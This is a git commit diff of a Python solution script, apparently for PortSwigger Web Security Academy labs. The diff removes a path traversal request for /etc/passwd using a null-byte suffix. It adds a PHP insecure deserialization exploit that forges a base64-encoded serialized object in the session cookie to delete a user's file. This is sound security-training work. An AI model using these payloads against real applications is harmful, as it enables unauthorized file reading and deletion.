9eb05f6b02316bd4e4b822df2f7a7019c323b59b
AT190510-Cuong <AT190510@actvn.edu.vn>
2024-01-20 10:37:29 +0700

    up

--- solve.py
+++ solve.py
@@ -3,15 +3,42 @@ import requests
 import re
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-# from bs4 import BeautifulSoup
+from bs4 import BeautifulSoup
+import base64
+from urllib.parse import quote
 
-url = 'https://0ad2005d04467e758442e62e00ef00ae.web-security-academy.net'
+url = 'https://0ac100c20301582f81ce454e00f300f8.web-security-academy.net'
 
 session = requests.Session()
 
-response = session.get(
-    url + '/image?filename=../../../../etc/passwd%001.png',
+# Đăng nhập 
+data_login = {
+    'username': 'wiener',
+    'password': 'peter',
+}
+
+response = requests.post(
+    url + "/login",
+    data = data_login,
+)
+
+# lấy data từ cookie và xử lí
+data_cookies = 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}'
+encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
+encode_url = quote(encode_base64)
+solve = encode_url
+
+cookies = {
+    'session': solve,
+}
+
+# dùng cookie đã sử lý để xóa carlos
+response = requests.get(
+    url + '/product?productId=1',
+    cookies=cookies,   
     verify=False,
 )
 
-print(response.text) # hiển thị response có flag
+# print(response.text) # hiển thị response có flag
+soup = BeautifulSoup(response.text, 'html.parser')
+print(soup)
